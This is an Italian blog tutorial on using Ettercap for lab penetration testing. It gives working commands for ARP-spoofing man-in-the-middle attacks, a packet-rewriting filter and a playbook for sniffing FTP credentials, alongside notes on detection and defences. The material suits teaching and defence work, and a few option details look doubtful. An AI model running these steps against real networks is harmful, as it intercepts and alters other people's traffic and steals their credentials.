---
title: >-
  Ettercap: Intercettare, Manipolare e Snoopare il Traffico di Rete con
  Facilità"
slug: ettercap
description: >-
  Scopri come usare Ettercap per attacchi man-in-the-middle, sniffing e
  manipolazione del traffico di rete. Una guida tecnica chiara pensata per chi
  esplora le basi dell'hacking etico e dell'analisi delle comunicazioni.
image: /ettercap.webp
draft: false
date: 2026-01-21T00:00:00.000Z
lastmod: 2026-01-25T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - ettercap
  - sniffing
  - mitm
---

# Ettercap: Intercettare, Manipolare e Snoopare il Traffico di Rete

Ettercap è il coltellino svizzero per gli attacchi Man-in-the-Middle (MITM) in ambito di penetration testing. In parole povere, ti permette di metterti in mezzo alla comunicazione tra due dispositivi in una rete locale (come il tuo lab), intercettando, modificando o registrando tutto il traffico che passa. In contesti come HackTheBox, TryHackMe o i tuoi lab virtuali, è uno strumento indispensabile per capire le vulnerabilità di rete, catturare credenziali in chiaro e testare le difese. In questa guida, passiamo dalla teoria all’azione: vedremo come installarlo, lanciare attacchi ARP spoofing, scrivere filtri per manipolare i pacchetti in tempo reale e come difenderti da queste tecniche. Ricorda: tutto solo su macchine di tua proprietà o in ambienti espressamente autorizzati.

## Cos’è Ettercap e Perché Usarlo in un Lab?

> **In breve:** Ettercap è un tool suite per attacchi MITM via ARP spoofing, sniffing di rete e iniezione di pacchetti. Nel pentesting, lo usi per analizzare il traffico in un lab, individuando credenziali non cifrate e vulnerabilità di protocollo.

Se stai affrontando una macchina su HackTheBox che ha servizi in chiaro (HTTP, FTP, Telnet), Ettercap può essere la chiave per sniffare password. È molto più leggero e integrato di Wireshark per certi tipi di attacchi attivi. Funziona su più sistemi, ma noi ci concentreremo su Kali Linux, la distro di riferimento. Il suo punto di forza? La capacità di eseguire **ARP poisoning** in modo silenzioso e di applicare **filtri** (scritti in C) che modificano i pacchetti al volo, prima che raggiungano la destinazione.

## Installazione e Configurazione Rapida su Kali Linux

> **In breve:** Su Kali Linux, Ettercap è preinstallato. Verificalo con `ettercap --version`. Se manca, installalo con `sudo apt update && sudo apt install ettercap-graphical`. La versione GUI (`-G`) è comoda, ma impariamo la CLI per automatizzare.

Kali di solito lo ha già. Apri un terminale e controlla:

```bash
ettercap --version
```

Se restituisce la versione (es. `0.8.3`), sei a posto. Altrimenti:

```bash
sudo apt update && sudo apt install ettercap-graphical -y
```

Per prima cosa, modifica il file di configurazione per evitare warning inutili:

```bash
sudo nano /etc/ettercap/etter.conf
```

Trova la sezione `[privs]` e assicurati che ci sia `ec_uid = 0` e `ec_gid = 0`. Poi, cerca `redir_command_on` e `redir_command_off` e decommentali (togli il `#`). Questo ti permetterà di usare il port forwarding se necessario. Salva e esci (`Ctrl+X`, `Y`, `Invio`).

## Anatomia di un Attacco MITM con ARP Spoofing

> **In breve:** L’attacco base avvelena le cache ARP di vittima e gateway, facendo credere a entrambi che il tuo IP sia l’altro. Così, tutto il traffico passa dalla tua macchina.

Il cuore di Ettercap è l’ARP spoofing. In una tipica rete lab (es. `192.168.1.0/24`), la vittima (`192.168.1.10`) comunica con il gateway (`192.168.1.1`). Tu (`192.168.1.100`) dici alla vittima: “Ehi, io sono il gateway”, e al gateway: “Ehi, io sono la vittima”. Risultato: i pacchetti di entrambi passano da te.

**Avvertenza:** Questo funziona solo su reti locali (LAN) e se l’obiettivo non ha difese come ARP inspection statico. Nei lab virtuali (VirtualBox, VMware) assicurati che le schede di rete siano in modalità bridge o NAT network per vedere il traffico reale.

## Comandi da Terminale: Sniffing Passivo e Attivo

> **In breve:** Usa `ettercap -Tq -i eth0` per sniffing passivo in testo. Per un MITM attivo, specifica target con `-M arp:remote /VITTIMA// /GATEWAY//`.

Lo sniffing passivo ascolta solo, senza iniettare traffico. Utile per mappare la rete.

```bash
sudo ettercap -Tq -i eth0
```

* `-T`: usa l’interfaccia testo (no GUI).
* `-q`: “quiet”, meno output rumoroso.
* `-i`: specifica l’interfaccia di rete (sostituisci `eth0` con la tua, trovata con `ip a`).

Per l’attacco MITM vero e proprio, il comando classico è:

```bash
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1//
```

* `-M arp:remote`: avvia il mitm con metodo ARP poisoning (remote).
* `//` separa IP e porta (se vuoi specificare una porta, es. `/192.168.1.10/80/`).
  Questo comando inizia l’attacco e mostrerà tutto il traffico intercettato in tempo reale. Per fermarlo, premi `q`.

**Problema comune:** Non vedi traffico? Controlla il firewall di Kali: `sudo systemctl stop firewalld`. Assicurati anche che l’IP forwarding sia abilitato: `echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward`.

## Scrivere e Usare Filtri Custom per Manipolare il Traffico

> **In breve:** I filtri Ettercap sono piccoli programmi in C che modificano i pacchetti. Li compili con `etterfilter` e li carichi durante l’attacco con `-F file.ef`.

Questo è dove Ettercap spacca. Immagina di voler sostituire ogni occorrenza della parola “password” con “HACKED” in una richiesta HTTP. Crei un file `filter.ex`:

```c
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "password")) {
        replace("password", "HACKED");
        msg("Filtro HTTP triggered!\n");
    }
}
```

Poi lo compili:

```bash
etterfilter filter.ex -o filter.ef
```

E lo carichi durante l’MITM:

```bash
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1// -F filter.ef
```

Ora, ogni volta che la vittima invia “password” in una richiesta web, il pacchetto verrà alterato. Puoi scrivere filtri per redirect, drop di pacchetti, sostituzione di stringhe in download… la creatività è il limite (nel lab!).

## Playbook 10 Minuti: Sniffare Credenziali FTP in un Lab

### Step 1 – Mappatura della Rete

Prima di attaccare, scopri chi c’è in rete. Usa un semplice scan ARP con `netdiscover` o `nmap` per trovare l’IP della vittima e del gateway nel tuo lab.

```bash
sudo netdiscover -r 192.168.1.0/24 -i eth0
```

### Step 2 – Avvio MITM su Specifici Target

Identificati vittima (`192.168.1.10`) e gateway (`192.168.1.1`). Lancia Ettercap in sniffing silenzioso mirato, loggando tutto su file.

```bash
sudo ettercap -Tqi eth0 -M arp:remote /192.168.1.10// /192.168.1.1// -L logfile
```

L’opzione `-L logfile` crea tre file: `logfile.ecp`, `logfile.eci` e `logfile.eco` con pacchetti, info e traffico.

### Step 3 – Filtrare e Isolare il Traffico FTP

Il log si riempirà velocemente. In un altro terminale, analizza in tempo reale il traffico catturato per cercare stringhe come “USER” e “PASS” tipiche di FTP.

```bash
sudo tail -f logfile.eco | grep -E "USER|PASS"
```

### Step 4 – Estrazione delle Credenziali

Quando la vittima esegue un login FTP non cifrato, vedrai nel log qualcosa come `USER mario` e `PASS secret123`. Prendi nota: quelle sono le credenziali compromesse.

### Step 5 – Pulizia e Riallineamento ARP

Finito l’esercizio, ferma Ettercap (`q`) e manda pacchetti ARP “honest” per ripristinare le cache di rete. Puoi usare `ettercap -M arp:remote /192.168.1.10// /192.168.1.1//` con l’opzione `--reverse` o semplicemente riavviare le macchine nel tuo lab virtuale.

## Checklist Rapida Ettercap

1. Verificare che Ettercap sia installato e configurato (`sudo ettercap --version`).
2. Identificare l’interfaccia di rete corretta per lo sniffing (`ip a`).
3. Disabilitare il firewall locale di Kali per evitare blocchi (`sudo systemctl stop firewalld`).
4. Abilitare l’IP forwarding per non interrompere il traffico della vittima (`echo 1 > /proc/sys/net/ipv4/ip_forward`).
5. Mappare la rete lab per individuare IP di vittima e gateway (`netdiscover` o `nmap -sn`).
6. Usare l’opzione `-L` per loggare il traffico catturato e analizzarlo offline.
7. Testare i filtri custom su una macchina di test prima di usarli in un scenario complesso.
8. Avere sempre a portata il comando per fermare l’MITM (premere `q` nell’interfaccia TUI).
9. Ricordarsi di ripristinare le tabelle ARP delle vittime dopo il test (riavvio o invio pacchetti ARP corretti).
10. Usare Ettercap solo su reti e dispositivi di cui si ha esplicito permesso di testare.

## Riassunto 80/20 Ettercap

| Obiettivo                         | Azione pratica                                            |                          Comando/Strumento |
| :-------------------------------- | :-------------------------------------------------------- | -----------------------------------------: |
| Sniffing passivo di rete          | Avviare Ettercap in modalità testo senza attacco MITM     |                     `ettercap -Tq -i eth0` |
| Avviare MITM via ARP spoofing     | Specificare target1 (vittima) e target2 (gateway)         |      `-M arp:remote /VITTIMA// /GATEWAY//` |
| Loggare traffico per analisi      | Salvare la cattura in file per esaminarla dopo            |                              `-L nomefile` |
| Compilare un filtro custom        | Scrivere codice C in `.ex` e generare file `.ef`          | `etterfilter miofiltro.ex -o miofiltro.ef` |
| Caricare filtro durante MITM      | Applicare il filtro compilato per manipolare pacchetti    |                          `-F miofiltro.ef` |
| Intercettare credenziali HTTP/FTP | Cercare stringhe “USER”, “PASS”, “Authorization:” nel log |         `grep -E "USER\|PASS" logfile.eco` |
| Fermare l’attacco MITM            | Uscire dall’interfaccia TUI e ripristinare ARP            | Premere `q`, poi riavviare macchine target |

## Concetti Controintuitivi su Ettercap

**“L’MITM funziona sempre e su tutti”**\
Falso. Switch moderni con protezioni (Port Security, DHCP Snooping) possono rilevare e bloccare l’ARP poisoning. Inoltre, connessioni cifrate (HTTPS, SSH) rendono lo sniffing inutile senza tecniche aggiuntive come SSL stripping (che funziona solo in condizioni specifiche).

**“Ettercap è invisibile”**\
Non proprio. Un sistema con un IDS/IPS di rete o anche un client con tool come `arpwatch` può rilevare anomalie ARP e generare allarmi. Nel mondo reale, un attacco MITM attivo è rumoroso.

**“Basta sniffare per avere le password”**\
Vero solo per protocolli non cifrati. Oggi la maggior parte del traffico è cifrata. L’uso di Ettercap in lab serve proprio a dimostrare i pericoli di servizi come FTP, Telnet o HTTP di base, spingendo per l’adozione di cifratura.

## FAQ su Ettercap

**D: Ettercap non trova l’interfaccia di rete, cosa fare?**\
R: Verifica il nome dell’interfaccia con `ip a`. Su Kali in VM, spesso è `eth0` o `ens33`. Se usi una connessione wireless, potrebbe essere `wlan0`. Usa quel nome esatto nell’opzione `-i`.

**D: Posso usare Ettercap per intercettare traffico HTTPS?**\
R: Non direttamente. Ettercap da solo non può decifrare HTTPS. Puoi provare tecniche come SSL stripping (con tool come `sslstrip`) per degradare HTTPS a HTTP, ma funziona solo se la vittima non usa HSTS. L’obiettivo in lab è evidenziare l’importanza di HSTS.

**D: Come faccio a sniffare solo il traffico di una specifica porta?**\
R: Puoi usare i filtri di cattura nella GUI, o dalla CLI specificare la porta nei target. Esempio: `/192.168.1.10/80/` catturerà solo traffico HTTP da/quella vittima. In alternativa, usa filtri di visualizzazione nel log post-cattura.

**D: Perché il mio computer vittima perde la connessione Internet durante l’attacco?**\
R: Probabilmente non hai abilitato l’IP forwarding su Kali. Il sistema riceve i pacchetti ma non li inoltra. Esegui `echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward` prima di lanciare Ettercap.

**D: Esiste un’alternativa a Ettercap per MITM?**\
R: Sì, tool come `bettercap` (più moderno e estendibile) e `arpspoof` (più semplice) possono fare parti del lavoro. Ettercap rimane uno strumento storico e completo, ma `bettercap` sta diventando lo standard per molti pentester.

## Riferimenti Autorevoli

* [Documentazione Ufficiale di Ettercap](https://www.kali.org/tools/ettercap/) - Per approfondire ogni opzione e funzionalità.
* [Repository GitHub di Bettercap](https://github.com/bettercap/bettercap) - Per esplorare l’evoluzione moderna degli strumenti MITM.

## Link Utili su HackIta

* [Come supportare HackIta](https://hackita.it/supporto/) – Se questa guida ti è stata utile, considera di sostenere il progetto per permetterci di creare più contenuti.
* [Tutti gli articoli di HackIta](https://hackita.it/articoli/) – Esplora altre guide pratiche su tool e tecniche di hacking etico.
* [Servizi professionali di HackIta](https://hackita.it/servizi/) – Se cerchi consulenza o formazione personalizzata per la tua azienda, contattaci.
* [Chi c’è dietro HackIta](https://hackita.it/about/) – Scopri la missione e le persone dietro questa community.

***

Se questa guida ti ha aiutato a prendere il controllo di un lab di rete, considera di supportare HackIta con una donazione. Ci permette di mantenere il sito e produrre contenuti di qualità per tutta la community.

Vuoi trasformare queste conoscenze in una skill professionale? Scopri i nostri percorsi di **formazione 1:1** su misura, dove approfondiamo tool come Ettercap in scenari realistici complessi.

La tua azienda ha bisogno di testare la resilienza alle tecniche MITM? I nostri **servizi di assessment di sicurezza** includono penetration test interni ed esterni per identificare e risolvere queste vulnerabilità.
